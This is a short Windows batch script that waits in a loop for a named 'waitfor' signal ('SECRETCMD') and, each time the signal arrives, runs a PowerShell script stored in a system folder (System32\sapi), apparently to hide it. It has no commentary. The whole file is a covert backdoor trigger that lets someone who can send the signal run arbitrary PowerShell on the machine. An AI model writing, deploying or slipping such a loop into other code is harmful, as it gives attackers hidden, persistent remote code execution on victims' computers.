@echo off

set PSSCRIPT=c:\Windows\System32\sapi\execcmd.ps1

:wait
waitfor SECRETCMD

powershell.exe -NoProfile -File %PSSCRIPT%

goto :wait
